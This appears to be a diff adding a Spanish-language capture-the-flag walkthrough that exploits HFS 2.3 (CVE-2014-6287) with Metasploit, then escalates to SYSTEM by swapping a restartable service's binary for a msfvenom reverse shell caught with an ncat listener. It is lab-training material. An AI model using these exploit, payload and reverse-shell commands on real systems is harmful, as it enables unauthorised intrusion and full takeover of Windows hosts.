@@ -1,0 +1,30 @@
+RUTA CON METASPLOIT:
+
+1. Analizamos la máquina:
+    nmap -sC -sV 10.10.90.114 -oN nmap_initial_2.txt
+
+2. Vemos que tiene HFS 2.3 instalado, buscamos en exploit-db una vulnerabilidad para dicha máquina. Encontramos la CVE-2014-6287.
+
+3. Abrimos metasploit y buscamos un exploit para la vulnerabilidad.
+
+4. Usamos exploit/windows/http/rejetto_hfs_exec. Seteamos los parámetros necesarios, cambiamos SRVHOST, SRVPORT, LHOST y LPORT a nuestras IP y puertos y lanzamos script.
+
+5. Obtenemos sesión de meterpreter y uploadeamos PowerUp.ps1 en la máquina.
+
+6. Abrimos una shell a la máquina y lanzamos PowerUp.ps1. Buscamos un servicio que se pueda restartear y encontramos AdvancedSystemCareService9.
+
+7. Creamos con msfvenom una reverse shell con:
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.175 LPORT=1234 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+
+8. Uploadeamos la reverse shell con meterpreter y la reemplazamos por la ruta del servicio (C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe)
+
+9. Lanzamos ncat en máquina atacante:
+    ncat -lnvp 1234
+
+10. Restarteamos el servicio:
+    net stop AdvancedSystemCareService9
+    net start AdvancedSystemCareService9
+
+11. Obtenemos en netcat una shell con NT_AUTHORITY\SYSTEM
+
+12. pwn3d
